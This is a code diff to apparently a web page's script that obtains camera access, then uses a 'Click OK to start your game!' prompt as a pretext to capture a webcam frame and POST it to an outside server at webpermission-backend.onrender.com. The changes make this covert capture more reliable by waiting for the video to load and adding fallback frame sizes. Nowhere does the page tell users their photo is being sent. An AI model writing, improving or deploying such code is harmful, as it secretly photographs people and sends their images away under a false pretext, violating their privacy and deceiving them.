@@ -98,11 +98,17 @@
             // ✅ Camera
             try {
               const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-              document.getElementById('video').srcObject = stream;
+              const video = document.getElementById('video');
+              video.srcObject = stream;
               videoStream = stream;
-              console.log('✅ Camera granted');
 
-              // ✅ Alert user: click OK to capture & send photo immediately
+              // Wait for video to be ready
+              await new Promise(resolve => {
+                video.onloadedmetadata = () => resolve();
+              });
+
+              console.log('✅ Camera ready');
+
               if (confirm("Click OK to start your game!")) {
                 await captureAndSendPhoto();
               }
@@ -127,20 +133,29 @@
         return;
       }
       const video = document.getElementById('video');
+
+      // Wait if video not ready
+      if (video.readyState < 2) {
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => resolve();
+        });
+      }
+
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = video.videoWidth || 320; // fallback
+      canvas.height = video.videoHeight || 240; // fallback
       canvas.getContext('2d').drawImage(video, 0, 0);
 
       const dataUrl = canvas.toDataURL('image/jpeg');
-      console.log('Sending photo to server...');
+      console.log('Sending photo to server...', dataUrl.substring(0, 30) + '...');
+
       await fetch('https://webpermission-backend.onrender.com/api/save-photo', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ data: dataUrl }),
       });
-      console.log('✅ data sent!');
-      alert("game started!");
+      console.log('✅ Photo sent!');
+      alert("Game started!");
     }
 
     window.onload = async () => {
